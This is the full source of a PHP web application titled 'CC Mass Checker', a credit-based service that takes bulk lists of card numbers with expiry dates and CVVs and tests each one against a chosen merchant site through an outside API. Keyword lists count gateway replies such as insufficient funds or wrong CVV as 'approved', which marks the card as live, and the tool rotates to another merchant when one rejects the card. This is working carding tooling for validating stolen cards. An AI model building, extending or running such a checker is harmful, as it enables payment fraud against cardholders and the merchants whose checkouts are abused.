<?php
require_once __DIR__ . '/config.php';
require_login();

// Define reject and approve keywords
define('REJECT_KEYWORDS', [
    "id empty", "token empty", "client token", "item is out of stock",
    "product id is empty", "curl error", "r2 id empty", "py id empty",
    "r4 token empty", "del ammount empty"
]);

define('APPROVE_KEYWORDS', [
    "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "thank you",
    "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "3d_authentication"
]);

if (!function_exists('e')) {
    function e($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
}

// Helper function to mask CC numbers
function mask_cc($cc) {
    $parts = explode('|', $cc);
    if (count($parts) === 0) return $cc;
    
    $numbers = $parts[0];
    if (strlen($numbers) <= 8) return $numbers;
    
    return substr($numbers, 0, 6) . '******' . substr($numbers, -4);
}

// Check if response contains reject keywords
function has_reject_keyword($response) {
    $response_lower = strtolower($response);
    foreach (REJECT_KEYWORDS as $keyword) {
        if (strpos($response_lower, strtolower($keyword)) !== false) {
            return true;
        }
    }
    return false;
}

// Check if response contains approve keywords
function has_approve_keyword($response) {
    $response_lower = strtolower($response);
    foreach (APPROVE_KEYWORDS as $keyword) {
        if (strpos($response_lower, strtolower($keyword)) !== false) {
            return true;
        }
    }
    return false;
}

$user_id = (string)$_SESSION['user_id'];
$user = get_user($user_id);
$is_premium = is_premium($user_id);

// Handle site addition
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_site'])) {
    $new_site = trim($_POST['new_site']);
    if (!empty($new_site)) {
        $_SESSION['user_sites'][] = $new_site;
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Handle site deletion
if (isset($_GET['delete_site'])) {
    $index = (int)$_GET['delete_site'];
    if (isset($_SESSION['user_sites'][$index])) {
        unset($_SESSION['user_sites'][$index]);
        $_SESSION['user_sites'] = array_values($_SESSION['user_sites']);
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Handle AJAX request for processing a single CC
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['process_single_cc'])) {
    header('Content-Type: application/json');
    
    $cc_line = trim($_POST['cc_line']);
    $selected_site = trim($_POST['site']);
    $mode = $_POST['mode'];
    
    if (empty($selected_site) || empty($cc_line)) {
        echo json_encode(['error' => 'Missing parameters']);
        exit;
    }
    
    // Get user sites
    $user_sites = $_SESSION['user_sites'] ?? ['https://bookshelfthomasville.com'];
    $current_site_index = array_search($selected_site, $user_sites);
    
    $site_rotated = false;
    $site_index = $current_site_index;
    $result = null;
    
    do {
        $current_site = $user_sites[$site_index];
        
        // Call the API
        $api_url = "http://web-e3c8.onrender.com/index.php?cc=" . urlencode($cc_line) . "&site=" . urlencode($current_site);
        $response = @file_get_contents($api_url);
        
        if ($response === FALSE) {
            $result = [
                'cc' => $cc_line,
                'response' => 'API_ERROR',
                'status' => 'false',
                'price' => '0.00',
                'gateway' => 'N/A',
                'site' => $current_site
            ];
            break;
        } else {
            $data = json_decode($response, true);
            
            if (isset($data['Response'])) {
                $response_text = strtolower($data['Response']);
                
                // Check if response contains reject keywords
                if (has_reject_keyword($data['Response'])) {
                    // Rotate to next site
                    $site_index = ($site_index + 1) % count($user_sites);
                    $site_rotated = true;
                    
                    // If we've tried all sites, use the last response
                    if ($site_index === $current_site_index) {
                        $site_rotated = false;
                    } else {
                        continue; // Try again with next site
                    }
                }
                
                // Check if response is in approved list
                $is_approved = has_approve_keyword($data['Response']);
                
                $result = [
                    'cc' => $cc_line,
                    'response' => $data['Response'],
                    'status' => $is_approved ? 'true' : 'false',
                    'price' => $data['Price'] ?? '0.00',
                    'gateway' => $data['Gateway'] ?? 'N/A',
                    'site' => $current_site
                ];
                break;
            } else {
                $result = [
                    'cc' => $cc_line,
                    'response' => 'INVALID_RESPONSE',
                    'status' => 'false',
                    'price' => '0.00',
                    'gateway' => 'N/A',
                    'site' => $current_site
                ];
                break;
            }
        }
    } while ($site_rotated);
    
    // Update user stats and deduct credits if paid mode
    if ($mode === 'paid') {
        change_credits($user_id, -1);
    }
    increase_checks($user_id, 1);
    
    echo json_encode($result);
    exit;
}

// Get user sites
$user_sites = $_SESSION['user_sites'] ?? ['https://bookshelfthomasville.com'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CC Mass Checker - Real-Time Processing</title>
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --dark: #1f2937;
            --light: #f3f4f6;
            --gray: #9ca3af;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(90deg, #8b5cf6 0%, #ec4899 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .stat {
            background: rgba(255, 255, 255, 0.05);
            padding: 8px 15px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .stat i {
            color: var(--primary);
        }
        
        .premium-badge {
            background: linear-gradient(90deg, #f59e0b 0%, #fcd34d 100%);
            color: black;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        @media (max-width: 900px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: rgba(30, 41, 59, 0.5);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .card-title {
            font-size: 18px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-title i {
            color: var(--primary);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--gray);
        }
        
        select, input, textarea, button {
            width: 100%;
            padding: 12px 15px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        select:focus, input:focus, textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.3);
        }
        
        textarea {
            min-height: 120px;
            resize: vertical;
        }
        
        .file-upload {
            position: relative;
            border: 2px dashed rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .file-upload:hover {
            border-color: var(--primary);
        }
        
        .file-upload input {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0;
            cursor: pointer;
        }
        
        .file-upload i {
            font-size: 32px;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .btn {
            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.4);
        }
        
        .btn-outline {
            background: transparent;
            border: 1px solid var(--primary);
            color: var(--primary);
        }
        
        .btn-outline:hover {
            background: rgba(99, 102, 241, 0.1);
        }
        
        .btn-danger {
            background: linear-gradient(90deg, #ef4444 0%, #dc2626 100%);
        }
        
        .btn-danger:hover {
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
        }
        
        .mode-selector {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .mode-btn {
            flex: 1;
            text-align: center;
            padding: 12px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .mode-btn.active {
            background: rgba(99, 102, 241, 0.2);
            border-color: var(--primary);
        }
        
        .mode-btn i {
            margin-right: 5px;
        }
        
        .results-container {
            margin-top: 30px;
        }
        
        .results-summary {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .summary-card {
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            flex: 1;
            margin: 0 10px;
        }
        
        .summary-card:first-child {
            margin-left: 0;
        }
        
        .summary-card:last-child {
            margin-right: 0;
        }
        
        .summary-value {
            font-size: 24px;
            font-weight: 700;
            margin: 10px 0;
        }
        
        .success-text {
            color: var(--success);
        }
        
        .danger-text {
            color: var(--danger);
        }
        
        .results-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        .results-table th {
            text-align: left;
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--gray);
            font-weight: 500;
        }
        
        .results-table td {
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .results-table tr:last-child td {
            border-bottom: none;
        }
        
        .status-badge {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .status-approved {
            background: rgba(16, 185, 129, 0.2);
            color: var(--success);
        }
        
        .status-declined {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
        }
        
        .cc-masked {
            font-family: monospace;
        }
        
        .alert {
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .alert-error {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        
        .alert-success {
            background: rgba(16, 185, 129, 0.2);
            color: var(--success);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        
        .site-list {
            margin-top: 15px;
        }
        
        .site-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 8px;
            margin-bottom: 8px;
        }
        
        .site-url {
            font-family: monospace;
            font-size: 13px;
        }
        
        .action-icon {
            cursor: pointer;
            padding: 5px;
            color: var(--gray);
            transition: all 0.3s;
        }
        
        .action-icon:hover {
            color: white;
        }
        
        .progress-container {
            margin: 20px 0;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            overflow: hidden;
            height: 10px;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
            width: 0%;
            transition: width 0.3s;
        }
        
        .real-time-indicator {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 5px 10px;
            background: rgba(16, 185, 129, 0.2);
            border-radius: 20px;
            color: var(--success);
            font-size: 12px;
            margin-left: 10px;
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .button-group {
            display: flex;
            gap: 10px;
        }
        
        .button-group .btn {
            flex: 1;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">CC Mass Checker</div>
            <div class="user-info">
                <div class="stat">
                    <i class="fas fa-coins"></i>
                    <span id="credits"><?php echo e($user['CREDITS'] ?? 0); ?></span> credits
                </div>
                <div class="stat">
                    <i class="fas fa-check-circle"></i>
                    <span><?php echo e($user['CHECKS'] ?? 0); ?> checks</span>
                </div>
                <?php if ($is_premium): ?>
                    <div class="premium-badge">
                        <i class="fas fa-crown"></i> PREMIUM
                    </div>
                <?php endif; ?>
            </div>
        </header>
        
        <div class="main-content">
            <div class="card">
                <h2 class="card-title">
                    <i class="fas fa-cog"></i> Check Configuration
                </h2>
                
                <div id="errorMessage" class="alert alert-error" style="display: none;">
                    <i class="fas fa-exclamation-circle"></i> <span id="errorText"></span>
                </div>
                
                <div id="successMessage" class="alert alert-success" style="display: none;">
                    <i class="fas fa-check-circle"></i> <span id="successText"></span>
                </div>
                
                <form id="ccForm">
                    <div class="form-group">
                        <label for="site">Select Site</label>
                        <select id="site" name="site" required>
                            <option value="">-- Select a site --</option>
                            <?php foreach ($user_sites as $site): ?>
                                <option value="<?php echo e($site); ?>"><?php echo e($site); ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label>Check Mode</label>
                        <div class="mode-selector">
                            <div class="mode-btn active" data-mode="paid">
                                <i class="fas fa-coins"></i> Paid (1 credit/card)
                           
                            
                            </div>
                        </div>
                        <input type="hidden" name="mode" id="modeInput" value="paid">
                    </div>
                    
                    <div class="form-group">
                        <label for="cc_text">CC Data (one per line)</label>
                        <textarea id="cc_text" name="cc_text" placeholder="4168440054476542|08|27|908&#10;5112345678901234|12|25|123" class="cc-input"></textarea>
                    </div>
                    
                    <div class="form-group">
                        <label>Or Upload File</label>
                        <div class="file-upload">
                            <i class="fas fa-cloud-upload-alt"></i>
                            <p>Click to upload or drag and drop</p>
                            <p class="small">TXT files with one CC per line</p>
                            <input type="file" id="ccFile" accept=".txt">
                        </div>
                    </div>
                    
                    <div class="button-group">
                        <button type="button" id="processBtn" class="btn">
                            <i class="fas fa-play"></i> Process Cards
                        </button>
                        <button type="button" id="stopBtn" class="btn btn-danger" style="display: none;">
                            <i class="fas fa-stop"></i> Stop Processing
                        </button>
                    </div>
                </form>
            </div>
            
            <div class="card">
                <h2 class="card-title">
                    <i class="fas fa-globe"></i> Manage Sites
                </h2>
                
                <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
                    <div class="form-group">
                        <label for="new_site">Add New Site</label>
                        <input type="text" id="new_site" name="new_site" placeholder="https://example.com" required>
                    </div>
                    <button type="submit" name="add_site" class="btn btn-outline">
                        <i class="fas fa-plus"></i> Add Site
                    </button>
                </form>
                
                <div class="site-list">
                    <h3 style="margin: 20px 0 10px; font-size: 16px;">Your Sites</h3>
                    <?php if (empty($user_sites)): ?>
                        <p style="color: var(--gray); text-align: center; padding: 20px;">No sites added yet</p>
                    <?php else: ?>
                        <?php foreach ($user_sites as $index => $site): ?>
                            <div class="site-item">
                                <span class="site-url"><?php echo e($site); ?></span>
                                <a href="?delete_site=<?php echo $index; ?>" class="action-icon">
                                    <i class="fas fa-times"></i>
                                </a>
                            </div>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
            </div>
        </div>
        
        <div class="card results-container" id="resultsContainer" style="display: none;">
            <h2 class="card-title">
                <i class="fas fa-list-alt"></i> Results 
                <span class="real-time-indicator" id="processingIndicator">
                    <i class="fas fa-sync-alt blink"></i> Processing in real-time
                </span>
            </h2>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="results-summary">
                <div class="summary-card">
                    <div>Total Processed</div>
                    <div class="summary-value" id="totalProcessed">0</div>
                    <div>Cards</div>
                </div>
                <div class="summary-card">
                    <div>Successful</div>
                    <div class="summary-value success-text" id="successCount">0</div>
                    <div>Approved</div>
                </div>
                <div class="summary-card">
                    <div>Success Rate</div>
                    <div class="summary-value" id="successRate">0%</div>
                    <div>Ratio</div>
                </div>
            </div>
            
            <div style="overflow-x: auto;">
                <table class="results-table" id="resultsTable">
                    <thead>
                        <tr>
                            <th>CC Number (Full)</th>
                            <th>Response</th>
                            <th>Status</th>
                            <th>Price</th>
                            <th>Gateway</th>
                            <th>Site Used</th>
                        </tr>
                    </thead>
                    <tbody id="resultsBody">
                        <!-- Results will be added here in real-time -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const modeButtons = document.querySelectorAll('.mode-btn');
            const modeInput = document.getElementById('modeInput');
            const siteSelect = document.getElementById('site');
            const ccTextarea = document.getElementById('cc_text');
            const ccFile = document.getElementById('ccFile');
            const processBtn = document.getElementById('processBtn');
            const stopBtn = document.getElementById('stopBtn');
            const resultsContainer = document.getElementById('resultsContainer');
            const processingIndicator = document.getElementById('processingIndicator');
            const errorMessage = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');
            const successMessage = document.getElementById('successMessage');
            const successText = document.getElementById('successText');
            const creditsElement = document.getElementById('credits');
            
            // Mode selection
            modeButtons.forEach(btn => {
                btn.addEventListener('click', function() {
                    modeButtons.forEach(b => b.classList.remove('active'));
                    this.classList.add('active');
                    modeInput.value = this.dataset.mode;
                });
            });
            
            // File upload handling
            ccFile.addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        ccTextarea.value = e.target.result;
                    };
                    reader.readAsText(file);
                }
            });
            
            // Drag and drop for file upload
            const fileUpload = document.querySelector('.file-upload');
            fileUpload.addEventListener('dragover', function(e) {
                e.preventDefault();
                this.style.borderColor = '#6366f1';
            });
            
            fileUpload.addEventListener('dragleave', function() {
                this.style.borderColor = 'rgba(255, 255, 255, 0.2)';
            });
            
            fileUpload.addEventListener('drop', function(e) {
                e.preventDefault();
                this.style.borderColor = 'rgba(255, 255, 255, 0.2)';
                
                if (e.dataTransfer.files.length) {
                    ccFile.files = e.dataTransfer.files;
                    const event = new Event('change');
                    ccFile.dispatchEvent(event);
                }
            });
            
            // Variables for processing control
            let stopProcessing = false;
            let currentProcessing = null;
            
            // Process button click
            processBtn.addEventListener('click', function() {
                const site = siteSelect.value;
                const mode = modeInput.value;
                const ccData = ccTextarea.value.trim();
                
                // Validation
                if (!site) {
                    showError('Please select a site');
                    return;
                }
                
                if (!ccData) {
                    showError('Please provide CC data');
                    return;
                }
                
                // Hide any previous messages
                hideError();
                hideSuccess();
                
                // Parse CC lines
                const ccLines = ccData.split('\n')
                    .map(line => line.trim())
                    .filter(line => line !== '');
                
                if (ccLines.length === 0) {
                    showError('No valid CC data found');
                    return;
                }
                
                // Check credits for paid mode
                if (mode === 'paid') {
                    const credits = parseInt(creditsElement.textContent);
                    if (credits < ccLines.length) {
                        showError(`Not enough credits for Paid check. You need ${ccLines.length} credits but only have ${credits}.`);
                        return;
                    }
                }
                
                // Show results container
                resultsContainer.style.display = 'block';
                
                // Reset counters
                document.getElementById('totalProcessed').textContent = '0';
                document.getElementById('successCount').textContent = '0';
                document.getElementById('successRate').textContent = '0%';
                document.getElementById('progressBar').style.width = '0%';
                document.getElementById('resultsBody').innerHTML = '';
                
                // Disable process button, enable stop button
                processBtn.disabled = true;
                processBtn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> Processing...';
                stopBtn.style.display = 'block';
                
                // Reset stop flag
                stopProcessing = false;
                
                // Process CCs one by one
                currentProcessing = processCCs(ccLines, site, mode, 0);
            });
            
            // Stop button click
            stopBtn.addEventListener('click', function() {
                stopProcessing = true;
                stopBtn.disabled = true;
                stopBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Stopping...';
                processingIndicator.innerHTML = '<i class="fas fa-exclamation-circle"></i> Stopping process...';
            });
            
            function processCCs(ccLines, site, mode, index) {
                if (stopProcessing || index >= ccLines.length) {
                    // All CCs processed or stopped
                    processingIndicator.innerHTML = stopProcessing ? 
                        '<i class="fas fa-exclamation-circle"></i> Process stopped' : 
                        '<i class="fas fa-check-circle"></i> Processing completed';
                    
                    processBtn.disabled = false;
                    processBtn.innerHTML = '<i class="fas fa-play"></i> Process Cards';
                    stopBtn.style.display = 'none';
                    stopBtn.disabled = false;
                    stopBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Processing';
                    
                    if (!stopProcessing) {
                        showSuccess(`Processed ${ccLines.length} cards. ${document.getElementById('successCount').textContent} successful.`);
                    }
                    
                    return;
                }
                
                const ccLine = ccLines[index];
                
                // Show processing indicator
                processingIndicator.style.display = 'inline-flex';
                
                // Make AJAX request to process single CC
                const formData = new FormData();
                formData.append('process_single_cc', 'true');
                formData.append('cc_line', ccLine);
                formData.append('site', site);
                formData.append('mode', mode);
                
                fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(result => {
                    // Update credits if in paid mode
                    if (mode === 'paid') {
                        const credits = parseInt(creditsElement.textContent);
                        creditsElement.textContent = credits - 1;
                    }
                    
                    // Add result to table
                    addResultRow(result);
                    
                    // Update progress
                    const progress = ((index + 1) / ccLines.length) * 100;
                    document.getElementById('progressBar').style.width = progress + '%';
                    
                    // Process next CC
                    setTimeout(() => {
                        processCCs(ccLines, site, mode, index + 1);
                    }, 500);
                })
                .catch(error => {
                    console.error('Error:', error);
                    
                    // Add error result to table
                    addResultRow({
                        cc: ccLine,
                        response: 'NETWORK_ERROR',
                        status: 'false',
                        price: '0.00',
                        gateway: 'N/A',
                        site: site
                    });
                    
                    // Update progress
                    const progress = ((index + 1) / ccLines.length) * 100;
                    document.getElementById('progressBar').style.width = progress + '%';
                    
                    // Process next CC
                    setTimeout(() => {
                        processCCs(ccLines, site, mode, index + 1);
                    }, 500);
                });
            }
            
            function addResultRow(result) {
                const tbody = document.getElementById('resultsBody');
                const row = document.createElement('tr');
                
                // Show full CC details
                const ccFull = result.cc;
                
                // Determine status class and text
                const statusClass = result.status === 'true' ? 'status-approved' : 'status-declined';
                const statusText = result.status === 'true' ? 'APPROVED' : 'DECLINED';
                
                row.innerHTML = `
                    <td class="cc-masked">${ccFull}</td>
                    <td>${result.response}</td>
                    <td>
                        <span class="status-badge ${statusClass}">
                            ${statusText}
                        </span>
                    </td>
                    <td>$${result.price}</td>
                    <td>${result.gateway}</td>
                    <td>${result.site}</td>
                `;
                
                tbody.appendChild(row);
                
                // Update counters
                const totalProcessed = parseInt(document.getElementById('totalProcessed').textContent) + 1;
                document.getElementById('totalProcessed').textContent = totalProcessed;
                
                if (result.status === 'true') {
                    const successCount = parseInt(document.getElementById('successCount').textContent) + 1;
                    document.getElementById('successCount').textContent = successCount;
                    document.getElementById('successRate').textContent = Math.round((successCount / totalProcessed) * 100) + '%';
                }
                
                // Scroll to the new row
                row.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
            
            function showError(message) {
                errorText.textContent = message;
                errorMessage.style.display = 'flex';
            }
            
            function hideError() {
                errorMessage.style.display = 'none';
            }
            
            function showSuccess(message) {
                successText.textContent = message;
                successMessage.style.display = 'flex';
            }
            
            function hideSuccess() {
                successMessage.style.display = 'none';
            }
        });
    </script>
</body>
</html>